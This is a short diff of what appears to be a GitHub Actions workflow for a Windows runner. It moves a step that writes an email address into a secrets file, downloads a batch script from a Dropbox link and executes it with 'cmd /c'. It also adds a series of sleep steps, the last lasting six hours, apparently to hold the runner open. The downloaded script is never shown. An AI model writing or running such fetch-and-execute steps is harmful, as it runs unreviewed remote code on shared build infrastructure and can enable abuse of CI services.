@@ -27,6 +27,12 @@ jobs:
       - name: F
         run:  start-sleep -s 300
 
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3fv6r025lzn92gv6atbbu/down.bat?rlkey=ti46bzfu0kss1kvcoazxe7iab&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
+      
       - name: G
         run: start-sleep 300
 
@@ -39,11 +45,17 @@ jobs:
       - name: J
         run: start-sleep -s 300
       
-      - name: Downloading & Setting Up
-        run: |
-         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3fv6r025lzn92gv6atbbu/down.bat?rlkey=ti46bzfu0kss1kvcoazxe7iab&dl=1" -OutFile "down.bat"
-         cmd /c down.bat
-
       - name: K
+        run: start-sleep 300
+
+      - name: L
+        run: start-sleep -s 300
+
+      - name: M
+        run: start-sleep 300
+
+      - name: N
+        run: start-sleep -s 300
+      
+      - name: O
         run: Start-sleep -Seconds 21600
